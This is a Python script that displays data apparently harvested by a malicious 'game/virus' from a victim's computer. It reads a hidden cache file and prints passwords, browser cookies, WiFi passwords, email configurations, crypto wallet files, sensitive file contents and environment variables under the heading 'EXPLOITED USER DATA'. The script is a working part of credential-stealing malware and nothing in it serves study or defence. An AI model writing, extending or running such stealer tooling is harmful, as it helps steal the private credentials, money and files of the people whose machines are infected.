#!/usr/bin/env python3
"""
Display all exploited data in clear text
"""
import json
import os
import sys
from datetime import datetime

def show_exploited_data():
    """Display all exploited data in clear text"""
    data_file = ".system_cache/comprehensive_data.json"
    
    if not os.path.exists(data_file):
        print("âŒ No exploited data found!")
        print(f"   File not found: {data_file}")
        print("   Run the game/virus first to collect data.")
        return
    
    print("=" * 80)
    print("EXPLOITED USER DATA (CLEAR TEXT)")
    print("=" * 80)
    print()
    
    try:
        with open(data_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except Exception as e:
        print(f"âŒ Error reading data file: {e}")
        return
    
    # Basic info
    print("ğŸ“‹ BASIC INFORMATION")
    print("-" * 80)
    print(f"  Timestamp: {data.get('timestamp', 'N/A')}")
    print(f"  Hostname: {data.get('hostname', 'N/A')}")
    print(f"  User: {data.get('user', 'N/A')}")
    print()
    
    # Passwords
    passwords = data.get('passwords', [])
    if passwords:
        print(f"ğŸ”‘ PASSWORDS ({len(passwords)} found)")
        print("-" * 80)
        for i, pwd in enumerate(passwords, 1):
            print(f"  {i}. Browser: {pwd.get('browser', 'Unknown')}")
            print(f"     File: {pwd.get('file', 'N/A')}")
            print(f"     Size: {pwd.get('size', 0)} bytes")
            print(f"     Hash: {pwd.get('hash', 'N/A')}")
            print()
    else:
        print("ğŸ”‘ PASSWORDS: None found")
        print()
    
    # Sensitive Files
    files = data.get('sensitive_files', [])
    if files:
        print(f"ğŸ“ SENSITIVE FILES ({len(files)} found)")
        print("-" * 80)
        for i, file_info in enumerate(files, 1):
            print(f"  {i}. Path: {file_info.get('path', 'N/A')}")
            print(f"     Size: {file_info.get('size', 0)} bytes")
            print(f"     Modified: {file_info.get('modified', 'N/A')}")
            if file_info.get('content'):
                # Decode base64 content
                try:
                    import base64
                    content = base64.b64decode(file_info['content']).decode('utf-8', errors='ignore')
                    # Show first 500 chars
                    preview = content[:500] + "..." if len(content) > 500 else content
                    print(f"     Content Preview:")
                    print(f"     {preview}")
                except:
                    print(f"     Content: [Base64 encoded, {len(file_info['content'])} chars]")
            print()
    else:
        print("ğŸ“ SENSITIVE FILES: None found")
        print()
    
    # Browser Data
    browser_data = data.get('browser_data', {})
    if browser_data:
        print("ğŸŒ BROWSER DATA")
        print("-" * 80)
        print(f"  Cookies: {len(browser_data.get('cookies', []))} files")
        print(f"  History: {len(browser_data.get('history', []))} files")
        print(f"  Bookmarks: {len(browser_data.get('bookmarks', []))} files")
        print(f"  Autofill: {len(browser_data.get('autofill', []))} files")
        print()
        
        # Show cookie files
        if browser_data.get('cookies'):
            print("  Cookie Files:")
            for cookie in browser_data['cookies'][:5]:  # Show first 5
                print(f"    - {cookie.get('browser', 'Unknown')}: {cookie.get('file', 'N/A')}")
            if len(browser_data['cookies']) > 5:
                print(f"    ... and {len(browser_data['cookies']) - 5} more")
            print()
    else:
        print("ğŸŒ BROWSER DATA: None found")
        print()
    
    # WiFi Passwords
    wifi = data.get('wifi_passwords', [])
    if wifi:
        print(f"ğŸ“¶ WIFI PASSWORDS ({len(wifi)} found)")
        print("-" * 80)
        for i, w in enumerate(wifi, 1):
            print(f"  {i}. SSID: {w.get('ssid', 'N/A')}")
            if w.get('config'):
                print(f"     Config: {w['config'][:200]}...")
            print()
    else:
        print("ğŸ“¶ WIFI PASSWORDS: None found")
        print()
    
    # Email Configs
    emails = data.get('email_configs', [])
    if emails:
        print(f"ğŸ“§ EMAIL CONFIGURATIONS ({len(emails)} found)")
        print("-" * 80)
        for i, email in enumerate(emails, 1):
            print(f"  {i}. Client: {email.get('client', 'Unknown')}")
            print(f"     File: {email.get('file', email.get('path', 'N/A'))}")
            if email.get('content'):
                print(f"     Content Preview: {email['content'][:200]}...")
            print()
    else:
        print("ğŸ“§ EMAIL CONFIGURATIONS: None found")
        print()
    
    # Databases
    databases = data.get('databases', [])
    if databases:
        print(f"ğŸ’¾ DATABASE FILES ({len(databases)} found)")
        print("-" * 80)
        for i, db in enumerate(databases[:10], 1):  # Show first 10
            print(f"  {i}. {db.get('path', 'N/A')}")
            print(f"     Size: {db.get('size', 0):,} bytes")
            print(f"     Modified: {db.get('modified', 'N/A')}")
        if len(databases) > 10:
            print(f"  ... and {len(databases) - 10} more")
        print()
    else:
        print("ğŸ’¾ DATABASE FILES: None found")
        print()
    
    # Crypto Wallets
    wallets = data.get('crypto_wallets', [])
    if wallets:
        print(f"ğŸ’° CRYPTOCURRENCY WALLETS ({len(wallets)} found)")
        print("-" * 80)
        for i, wallet in enumerate(wallets, 1):
            print(f"  {i}. Type: {wallet.get('type', 'Unknown')}")
            print(f"     File: {wallet.get('file', 'N/A')}")
            print(f"     Size: {wallet.get('size', 0):,} bytes")
            print()
    else:
        print("ğŸ’° CRYPTOCURRENCY WALLETS: None found")
        print()
    
    # Recent Documents
    docs = data.get('recent_documents', [])
    if docs:
        print(f"ğŸ“„ RECENT DOCUMENTS ({len(docs)} found)")
        print("-" * 80)
        for i, doc in enumerate(docs[:10], 1):  # Show first 10
            print(f"  {i}. {doc.get('path', 'N/A')}")
            print(f"     Size: {doc.get('size', 0):,} bytes")
            print(f"     Modified: {doc.get('modified', 'N/A')}")
        if len(docs) > 10:
            print(f"  ... and {len(docs) - 10} more")
        print()
    else:
        print("ğŸ“„ RECENT DOCUMENTS: None found")
        print()
    
    # System Info
    sys_info = data.get('system_info', {})
    if sys_info:
        print("ğŸ–¥ï¸  SYSTEM INFORMATION")
        print("-" * 80)
        print(f"  Hostname: {sys_info.get('hostname', 'N/A')}")
        print(f"  User: {sys_info.get('user', 'N/A')}")
        print(f"  Home: {sys_info.get('home', 'N/A')}")
        
        env_vars = sys_info.get('environment_variables', {})
        if env_vars:
            print(f"  Environment Variables ({len(env_vars)} sensitive):")
            for key, value in list(env_vars.items())[:5]:
                print(f"    {key} = {value}")
            if len(env_vars) > 5:
                print(f"    ... and {len(env_vars) - 5} more")
        
        if sys_info.get('uptime_seconds'):
            uptime_hours = sys_info['uptime_seconds'] / 3600
            print(f"  Uptime: {uptime_hours:.1f} hours")
        print()
    
    print("=" * 80)
    print("âœ… Data display complete")
    print(f"ğŸ“ Full data saved in: {data_file}")
    print("=" * 80)

if __name__ == "__main__":
    show_exploited_data()

